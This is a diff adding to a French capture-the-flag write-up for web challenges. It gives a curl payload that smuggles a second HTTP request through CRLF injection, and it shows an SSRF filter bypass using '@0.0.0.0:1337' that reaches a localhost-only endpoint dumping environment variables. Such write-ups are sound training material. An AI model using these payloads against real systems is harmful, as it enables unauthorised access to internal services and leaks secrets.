@@ -243,3 +243,72 @@ Voir :
 Payload final : 
 
     curl "83.136.251.235:34303/api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/" 
+
+
+## ProxyAsAService
+
+Le site permet de rediriger vers d'autres URL. En allant sur le site pour la première fois, on est automatiquement redirigé vers une URL de type "http://83.136.251.235:45235/?url=/r/catvideos/"
+
+Dans le fichier **routes.py** on peut voir que le site renvoie effectivement sur un subreddit de chats si aucune valeur n'est spécifiée dans le paramètre "?url=" :
+
+    @proxy_api.route('/', methods=['GET', 'POST'])
+    def proxy():
+        url = request.args.get('url')
+
+        if not url:
+            cat_meme_subreddits = [
+                '/r/cats/',
+                '/r/catpictures',
+                '/r/catvideos/'
+            ]
+
+            random_subreddit = random.choice(cat_meme_subreddits)
+
+            return redirect(url_for('.proxy', url=random_subreddit))
+
+        target_url = f'http://{SITE_NAME}{url}'
+        response, headers = proxy_req(target_url)
+
+        return Response(response.content, response.status_code, headers.items())
+
+Cela ressemble à un scénario de SSRF.
+
+Dans le fichier **util.py** on peut voir une petite couche de sanitization : 
+
+    RESTRICTED_URLS = ['localhost', '127.', '192.168.', '10.', '172.']
+
+    def is_safe_url(url):
+        for restricted_url in RESTRICTED_URLS:
+            if restricted_url in url:
+                return False
+        return True
+
+    def is_from_localhost(func):
+        @functools.wraps(func)
+        def check_ip(*args, **kwargs):
+            if request.remote_addr != '127.0.0.1':
+                return abort(403)
+            return func(*args, **kwargs)
+        return check_ip
+
+On voit que ni les caractères '@', ni l'adresse "0.0.0.0" ne sont filtrés, on peut donc utiliser une combinaison de ces deux techniques pour contourner les filtres. 
+
+On devrait donc pouvoir accéder à l'environnement, qui est censé être réservé au serveur en local : 
+
+    @debug.route('/environment', methods=['GET'])
+    @is_from_localhost
+    def debug_environment():
+        environment_info = {
+            'Environment variables': dict(os.environ),
+            'Request headers': dict(request.headers)
+        }
+
+        return jsonify(environment_info)
+
+Grâce au fichier **run.py** on sait que le port utilisé par l'application est 1337.
+        
+URL finale à forger : 
+
+    http://83.136.251.235:45235/?url=@0.0.0.0:1337/debug/environment
+    
+Le flag se trouve dans une des variables d'environnement.
